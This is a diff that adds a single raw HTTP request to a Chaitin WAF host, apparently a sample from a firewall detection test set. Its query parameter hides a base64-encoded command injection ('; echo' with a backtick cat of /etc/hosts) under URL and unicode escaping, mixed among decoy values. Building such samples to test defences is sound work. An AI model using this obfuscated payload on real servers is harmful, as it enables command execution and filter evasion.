@@ -1,0 +1,13 @@
+PUT /threshold/vulnerability/composite?remediation=%5B%0A%22%5Cu0063%5Cu006F%5Cu006E%5Cu0074%5Cu0072%5Cu0061%5Cu0073%5Cu0074%22%2C%2015%2C%0D%22%5Cu004F%5Cu0079%5Cu0042%5Cu006c%5Cu0059%5Cu0032%5Cu0068%5Cu0076%5Cu0049%5Cu0047%5Cu0041%5Cu0076%5Cu0059%5Cu006d%5Cu006C%5Cu0075%5Cu004C%5Cu0032%5Cu004e%5Cu0068%5Cu0064%5Cu0043%5Cu0041%5Cu0076%5Cu005a%5Cu0058%5Cu0052%5Cu006A%5Cu004C%5Cu0032%5Cu0068%5Cu0076%5Cu0063%5Cu0033%5Cu0052%5Cu007A%5Cu0059%5Cu0041%5Cu003d%5Cu003D%22%2C%22%5Cu0055%5Cu0041%5Cu0054%22%2C%0A%5B%0Afalse%2C%0Dfalse%09%0A%5D%2C%0D22%2C%20%22%5Cu0072%5Cu0065%5Cu0074%5Cu0061%5Cu0069%5Cu006E%22%20%5D%0D HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
+Cookie: amortization=optional; scope=multi; SESSIONID=b21b4b311e7515aec41df155bba86801d90df1af44e92c85d3d02d37a98fbbfbb2ee76ad2814ab7e28bd84b63f6832a0
+
